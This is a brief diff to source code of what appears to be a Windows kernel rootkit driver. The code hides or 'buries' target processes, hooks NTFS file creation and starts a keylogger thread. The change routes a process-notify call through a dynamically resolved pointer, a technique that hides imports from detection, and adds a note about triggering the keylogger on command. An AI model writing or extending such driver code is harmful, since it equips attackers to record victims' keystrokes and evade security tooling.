@@ -71,8 +71,7 @@ BeUnload(PDRIVER_OBJECT DriverObject)
     // Remove our bury routine if we set one
     if(BeGlobals::beBuryTargetProcesses.length != 0)
     {
-        // TODO: resolve dynamically, also at other usages
-        if (PsSetCreateProcessNotifyRoutineEx(BeBury_ProcessNotifyRoutineEx, TRUE) == STATUS_SUCCESS)
+        if (BeGlobals::pPsSetCreateProcessNotifyRoutineEx(BeBury_ProcessNotifyRoutineEx, TRUE) == STATUS_SUCCESS)
         {
             LOG_MSG("Removed routine!\n");
         }
@@ -203,6 +202,7 @@ DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
     NtStatus = BeHookNTFSFileCreate();
 #endif
 
+    // TODO: move to IOCTL and start only upon command
     // Start Keylogger Thread
     BeGlobals::runKeyLogger = true;
     PKTHREAD ThreadObject;
